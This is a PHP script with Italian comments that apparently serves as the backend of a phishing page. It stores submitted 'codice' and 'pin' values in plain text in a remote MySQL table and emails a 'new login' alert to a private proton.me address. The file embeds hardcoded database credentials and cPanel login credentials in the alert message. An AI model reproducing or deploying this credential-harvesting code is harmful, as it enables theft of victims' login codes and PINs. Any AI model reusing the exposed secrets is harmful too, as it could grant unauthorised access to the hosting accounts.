<?php
header('Content-Type: application/json');

// Ricevi i dati JSON
$data = json_decode(file_get_contents('php://input'), true);

// Verifica che i dati siano presenti
if (!isset($data['codice']) || !isset($data['pin'])) {
    http_response_code(400);
    echo json_encode(['success' => false, 'error' => 'Dati mancanti']);
    exit;
}

// Pulisci i dati in input
$codice = filter_var($data['codice'], FILTER_SANITIZE_STRING);
$pin = filter_var($data['pin'], FILTER_SANITIZE_STRING);

// Configurazione database MySQL per XAMPP
$host = 'sql201.infinityfree.com';
$dbname = 'if0_39314669_isp'; // Assicurati che questo sia il nome del tuo database
$username = 'if0_39314669';
$password = 'GpobECoKXoMGF'; // La password di default per XAMPP è vuota

try {
    // Connessione al database
    $conn = new PDO("mysql:host=$host;dbname=$dbname", $username, $password);
    $conn->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
    
    // Prepara e esegui la query per la tabella 'users'
    $stmt = $conn->prepare("INSERT INTO users (codice, pin) VALUES (:codice, :pin)");
    $stmt->bindParam(':codice', $codice);
    $stmt->bindParam(':pin', $pin);
    $stmt->execute();
    
    echo json_encode(['success' => true]);

      // Invia notifica email
  $to = 'distefanomartina99@proton.me';
  $subject = 'Nuovo login effettuato';
  $message = 'Un nuovo utente ha appena effettuato l\'accesso. verifica qui: https://shark.bwys.net:2083/ user: swyftxlo pass: EmeQ63As[80Y)l';
  $headers = 'From: noreply@' . $_SERVER['SERVER_NAME'] . "\r\n" .
             'Reply-To: noreply@' . $_SERVER['SERVER_NAME'] . "\r\n" .
             'X-Mailer: PHP/' . phpversion();

  // Aggiungi un controllo per l'invio della mail
  @mail($to, $subject, $message, $headers);

} catch(PDOException $e) {
    http_response_code(500);
    echo json_encode(['success' => false, 'error' => 'Errore database: ' . $e->getMessage()]);
    error_log("Errore Database: " . $e->getMessage());
} 

